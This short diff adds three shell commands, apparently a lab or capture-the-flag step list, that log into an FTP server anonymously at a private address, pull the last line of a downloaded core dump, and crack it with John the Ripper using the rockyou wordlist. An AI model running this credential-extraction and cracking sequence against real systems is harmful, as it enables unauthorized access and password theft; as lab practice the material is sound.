@@ -1,0 +1,3 @@
+ftp anonymous@192.168.1.110
+strings downloads/etc/core | tail -n 1 > coredump
+john --rules --wordlist=rockyou.txt coredump
